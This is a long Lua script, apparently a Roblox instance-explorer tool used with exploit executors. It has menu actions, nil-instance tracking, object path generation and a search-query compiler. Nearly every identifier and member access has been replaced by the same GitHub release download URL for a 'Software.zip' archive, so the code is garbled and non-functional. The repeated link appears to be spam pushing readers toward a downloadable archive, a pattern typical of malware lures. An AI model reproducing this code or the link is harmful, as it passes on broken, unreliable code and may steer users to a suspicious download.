			selection:SetTable(newSelection)
			if #newSelection > 0 then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newSelection[1])
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end})

		context:Register("SELECT_LOCAL_PLAYER",{Name = "Select Local Player", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = 9, OnClick = function()
			pcall(function() if nodes[plr] then selection:Set(nodes[plr]) https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(nodes[plr]) end end)
		end})

		context:Register("REFRESH_NIL",{Name = "Refresh Nil Instances", OnClick = function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end})
		
		context:Register("HIDE_NIL",{Name = "Hide Nil Instances", OnClick = function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end})

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = context
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(nilMap)
		
		local disconnectCon = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Folder").ChildAdded:Connect(function() end).Disconnect
		for i,v in next,nilCons do
			disconnectCon(v[1])
			disconnectCon(v[2])
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(nilCons)

		for i = 1,#nilNode do
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(removeObject)(nilNode[i].Obj)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

		local nilInsts = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		local getDescs = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		--local newNilMap = {}
		--local newNilRoots = {}
		--local nilRoots = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		--local connect = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		--local disconnect
		--if not nilRoots then nilRoots = {} https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nilRoots end

		for i = 1,#nilInsts do
			local obj = nilInsts[i]
			if obj ~= game["Run Service"].Parent then
				nilMap[obj] = true
				--newNilRoots[obj] = true

				local descs = getDescs(obj)
				for j = 1,#descs do
					nilMap[descs[j]] = true
				end
			end
		end

		-- Remove unmapped nil nodes
		--[[for i = 1,#nilNode do
			local node = nilNode[i]
			if not newNilMap[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] then
				nilMap[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = nil
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(removeObject)(node)
			end
		end]]

		--nilMap = newNilMap

		for i = 1,#nilInsts do
			local obj = nilInsts[i]
			local node = nodes[obj]
			if not node then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(addObject)(obj) end
		end

		--[[
		-- Remove old root connections
		for obj in next,nilRoots do
			if not newNilRoots[obj] then
				if not disconnect then disconnect = obj[1].Disconnect end
				disconnect(obj[1])
				disconnect(obj[2])
			end
		end
		
		for obj in next,newNilRoots do
			if not nilRoots[obj] then
				nilRoots[obj] = {
					connect(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,addObject),
					connect(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,removeObject)
				}
			end
		end]]

		--nilMap = newNilMap
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newNilRoots

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(obj)
		local ffc = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local getCh = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local path = ""
		local curObj = obj
		local ts = tostring
		local match = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local gsub = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local tableFind = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local useGetCh = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local formatLuaString = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		while curObj do
			if curObj == game["Run Service"].Parent then
				path = "game"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				break
			end

			local className = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local curName = ts(curObj)
			local indexName
			if match(curName,"^[%a_][%w_]*$") then
				indexName = "."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			else
				local cleanName = formatLuaString(curName)
				indexName = '["'https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip'"]'
			end

			local parObj = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if parObj then
				local fc = ffc(parObj,curName)
				if useGetCh and fc and fc ~= curObj then
					local parCh = getCh(parObj)
					local fcInd = tableFind(parCh,curObj)
					indexName = ":GetChildren()["https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"]"
				elseif parObj == game["Run Service"].Parent and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[className] and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[className]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					indexName = ':GetService("'https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip'")'
				end
			elseif parObj == nil then
				local getnil = "local getNil = function(name, class) for _, v in next, getnilinstances() do if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == class and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == name then return v end end end"
				local gotnil = "\n\ngetNil(\"%s\", \"%s\")"
				indexName = getnil .. gotnil:format(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, className)
			end

			path = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			curObj = parObj
		end

		return path
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local context = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 400
		context:ApplyTheme({
			ContentColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
			OutlineColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
			DividerColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
			TextColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
			HighlightColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		})

		local classes = {}
		for i,class in next,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip do
			local tags = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				local rmdEntry = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
				classes[#classes+1] = {class,rmdEntry and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "Uncategorized"}
			end
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(classes,function(a,b)
			if a[2] ~= b[2] then
				return a[2] < b[2]
			else
				return a[1].Name < b[1].Name
			end
		end)

		local function onClick(className)
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local instNew = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			for i = 1,#sList do
				local node = sList[i]
				local obj = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(node,true)
				pcall(instNew,className,obj)
			end
		end

		local lastCategory = ""
		for i = 1,#classes do
			local class = classes[i][1]
			local rmdEntry = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			local iconInd = rmdEntry and tonumber(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or 0
			local category = classes[i][2]

			if lastCategory ~= category then
				context:AddDivider(category)
				lastCategory = category
			end
			context:Add({Name = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = iconInd, OnClick = onClick})
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = context
	end

	--[[
		Headers, Setups, Predicate, ObjectDefs
	]]
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = { -- TODO: Use data table (so we can disable some if funcs don't exist)
		Comparison = {
			["isa"] = function(argString)
				local lower = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local find = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local classQuery = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(argString)[1]
				if not classQuery then return end
				classQuery = lower(classQuery)

				local className
				for class,_ in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
					local cName = lower(class)
					if cName == classQuery then
						className = class
						break
					elseif find(cName,classQuery,1,true) then
						className = class
					end
				end
				if not className then return end

				return {
					Headers = {"local isa = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"},
					Predicate = "isa(obj,'"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"')"
				}
			end,
			["remotes"] = function(argString)
				return {
					Headers = {"local isa = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"},
					Predicate = "isa(obj,'RemoteEvent') or isa(obj,'RemoteFunction')"
				}
			end,
			["bindables"] = function(argString)
				return {
					Headers = {"local isa = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"},
					Predicate = "isa(obj,'BindableEvent') or isa(obj,'BindableFunction')"
				}
			end,
			["rad"] = function(argString)
				local num = tonumber(argString)
				if not num then return end

				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("HumanoidRootPart") or not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("BasePart") then return end

				return {
					Headers = {"local isa = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip", "local hrp = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"},
					Setups = {"local hrpPos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"},
					ObjectDefs = {"local isBasePart = isa(obj,'BasePart')"},
					Predicate = "(isBasePart and (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip).Magnitude <= "https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip")"
				}
			end,
		},
		Specific = {
			["players"] = function()
				return function() return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
			end,
			["loadedmodules"] = function()
				return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end,
		},
		Default = function(argString,caseSensitive)
			local cleanString = argString:gsub("\"","\\\""):gsub("\n","\\n")
			if caseSensitive then
				return {
					Headers = {"local find = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"},
					ObjectDefs = {"local objName = tostring(obj)"},
					Predicate = "find(objName,\"" .. cleanString .. "\",1,true)"
				}
			else
				return {
					Headers = {"local lower = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip","local find = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip","local tostring = tostring"},
					ObjectDefs = {"local lowerName = lower(tostring(obj))"},
					Predicate = "find(lowerName,\"" .. cleanString:lower() .. "\",1,true)"
				}
			end
		end,
		SpecificDefault = function(n)
			return {
				Headers = {},
				ObjectDefs = {"local isSpec"..n.." = specResults["..n.."][node]"},
				Predicate = "isSpec"..n
			}
		end,
	}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(query)
		local specFilterList,specMap = {},{}
		local finalPredicate = ""
		local rep = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local formatQuery = query:gsub("\\.","  "):gsub('".-"',function(str) return rep(" ",#str) end)
		local headers = {}
		local objectDefs = {}
		local setups = {}
		local find = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local sub = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local lower = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local match = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local ops = {
			["("] = "(",
			[")"] = ")",
			["||"] = " or ",
			["&&"] = " and "
		}
		local filterCount = 0
		local compFilters = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local specFilters = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local init = 1
		local lastOp = nil

		local function processFilter(dat)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				local t = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				for i = 1,#t do
					headers[t[i]] = true
				end
			end

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				local t = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				for i = 1,#t do
					objectDefs[t[i]] = true
				end
			end

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				local t = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				for i = 1,#t do
					setups[t[i]] = true
				end
			end

			finalPredicate = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end

		local found = {}
		local foundData = {}
		local find = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local sub = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		local function findAll(str,pattern)
			local count = #found+1
			local init = 1
			local sz = #pattern
			local x,y,extra = find(str,pattern,init,true)
			while x do
				found[count] = x
				foundData[x] = {sz,pattern}

				count = count+1
				init = y+1
				x,y,extra = find(str,pattern,init,true)
			end
		end
		local start = tick()
		findAll(formatQuery,'&&')
		findAll(formatQuery,"||")
		findAll(formatQuery,"(")
		findAll(formatQuery,")")
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(found)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(found,#formatQuery+1)

		local function inQuotes(str)
			local len = #str
			if sub(str,1,1) == '"' and sub(str,len,len) == '"' then
				return sub(str,2,len-1)
			end
		end

		for i = 1,#found do
			local nextInd = found[i]
			local nextData = foundData[nextInd] or {1}
			local op = ops[nextData[2]]
			local term = sub(query,init,nextInd-1)
			term = match(term,"^%s*(.-)%s*$") or "" -- Trim

			if #term > 0 then
				if sub(term,1,1) == "!" then
					term = sub(term,2)
					finalPredicate = finalPredicate.."not "
				end

				local qTerm = inQuotes(term)
				if qTerm then
					processFilter(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(qTerm,true))
				else
					local x,y = find(term,"%S+")
					if x then
						local first = sub(term,x,y)
						local specifier = sub(first,1,1) == "/" and lower(sub(first,2))
						local compFunc = specifier and compFilters[specifier]
						local specFunc = specifier and specFilters[specifier]

						if compFunc then
							local argStr = sub(term,y+2)
							local ret = compFunc(inQuotes(argStr) or argStr)
							if ret then
								processFilter(ret)
							else
								finalPredicate = finalPredicate.."false"
							end
						elseif specFunc then
							local argStr = sub(term,y+2)
							local ret = specFunc(inQuotes(argStr) or argStr)
							if ret then
								if not specMap[term] then
									specFilterList[#specFilterList + 1] = ret
									specMap[term] = #specFilterList
								end
								processFilter(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(specMap[term]))
							else
								finalPredicate = finalPredicate.."false"
							end
						else
							processFilter(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(term))
						end
					end
				end				
			end

			if op then
				finalPredicate = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				if op == "(" and (#term > 0 or lastOp == ")") then -- Handle bracket glitch
					return
				else
					lastOp = op
				end
			end
			init = nextInd+nextData[1]
		end

		local finalSetups = ""
		local finalHeaders = ""
		local finalObjectDefs = ""

		for setup,_ in next,setups do finalSetups = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"\n" end
		for header,_ in next,headers do finalHeaders = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"\n" end
		for oDef,_ in next,objectDefs do finalObjectDefs = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"\n" end

		local template = [==[
local searchResults = searchResults
local nodes = nodes
local expandTable = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
local specResults = specResults
local service = service

%s
local function search(root)	
%s
	
	local expandedpar = false
	for i = 1,#root do
		local node = root[i]
		local obj = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		
%s
		
		if %s then
			expandTable[node] = 0
			searchResults[node] = true
			if not expandedpar then
				local parnode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				while parnode and (not searchResults[parnode] or expandTable[parnode] == 0) do
					expandTable[parnode] = true
					searchResults[parnode] = true
					parnode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				end
				expandedpar = true
			end
		end
		
		if #node > 0 then search(node) end
	end
end
return search]==]

		local funcStr = template:format(finalHeaders,finalSetups,finalObjectDefs,finalPredicate)
		local s,func = pcall(loadstring,funcStr)
		if not s or not func then return nil,specFilterList end

		local env = setmetatable({["searchResults"] = searchResults, ["nodes"] = nodes, ["Explorer"] = Explorer, ["specResults"] = specResults,
			["service"] = service},{__index = getfenv()})
		setfenv(func,env)

		return func(),specFilterList
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(query)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(searchResults)
		expanded = (#query == 0 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		searchFunc = nil

		if #query > 0 then	
			local expandTable = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local specFilters

			local lower = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local find = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local tostring = tostring

			local lowerQuery = lower(query)

			local function defaultSearch(root)
				local expandedpar = false
				for i = 1,#root do
					local node = root[i]
					local obj = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

					if find(lower(tostring(obj)),lowerQuery,1,true) then
						expandTable[node] = 0
						searchResults[node] = true
						if not expandedpar then
							local parnode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							while parnode and (not searchResults[parnode] or expandTable[parnode] == 0) do
								expanded[parnode] = true
								searchResults[parnode] = true
								parnode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							end
							expandedpar = true
						end
					end

					if #node > 0 then defaultSearch(node) end
				end
			end

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				local start = tick()
				searchFunc,specFilters = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(query)
				--print("BUILD SEARCH",tick()-start)
			else
				searchFunc = defaultSearch
			end

			if specFilters then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(specResults)
				for i = 1,#specFilters do -- Specific search filers that returns list of matches
					local resMap = {}
					specResults[i] = resMap
					local objs = specFilters[i]()
					for c = 1,#objs do
						local node = nodes[objs[c]]
						if node then
							resMap[node] = true
						end
					end
				end
			end

			if searchFunc then
				local start = tick()
				searchFunc(nodes[game["Run Service"].Parent])
				searchFunc(nilNode)
				--warn(tick()-start)
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ""
		expanded = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		searchFunc = nil
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local searchBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = searchBox

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(searchBox)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		end)
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		entryTemplate = create({
			{1,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),Font=3,Name="Entry",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,250,0,20),Text="",TextSize=14,}},
			{2,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.04313725605607,0.35294118523598,0.68627452850342),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33725491166115,0.49019610881805,0.73725491762161),BorderSizePixel=0,Name="Indent",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-20,1,0),}},
			{3,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="EntryName",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,26,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-26,1,0),Text="Workspace",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
			{4,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,ClipsDescendants=true,Font=3,Name="Expand",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-20,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,20),Text="",TextSize=14,}},
			{5,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5642383285",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(144,16),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(16,16),Name="Icon",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,2),ScaleType=4,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
			{6,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(304,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(16,16),Name="Icon",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4,0,2),ScaleType=4,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
		})

		local sys = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {1,2}
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(item,combo,button)
			local ind = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(listEntries,item)
			if not ind then return end
			local node = tree[ind + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not node then return end

			local entry = listEntries[ind]

			if button == 1 then
				if combo == 2 then
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("LuaSourceContainer") then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					elseif #node > 0 and expanded[node] ~= 0 then
						expanded[node] = not expanded[node]
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
					end
				end

				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
					return
				end

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[node]

				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() then
					if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

					local fromIndex = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(tree,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					local toIndex = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(tree,node)
					if not fromIndex or not toIndex then return end
					fromIndex,toIndex = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(fromIndex,toIndex),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(fromIndex,toIndex)

					local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					for i = #sList,1,-1 do
						local elem = sList[i]
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[elem] then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[elem] = nil
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(sList,i)
						end
					end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
					for i = fromIndex,toIndex do
						local elem = tree[i]
						if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[elem] then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[elem] = true
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[elem] = true
							sList[#sList+1] = elem
						end
					end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[node] then selection:Remove(node) else selection:Add(node) end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = node
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
				elseif not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[node] then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
					selection:Set(node)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = node
				end
			elseif button == 2 then
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) then
					return
				end

				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[node] then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
					selection:Set(node)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = node
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				end
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(item,combo,button)
			local ind = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(listEntries,item)
			if not ind then return end
			local node = tree[ind + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not node then return end

			if button == 1 then
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[node] and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
					selection:Set(node)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = node
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				end

				local id = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				if combo == 1 and id == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[node] then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(node)
				end
			elseif button == 2 then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = sys
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
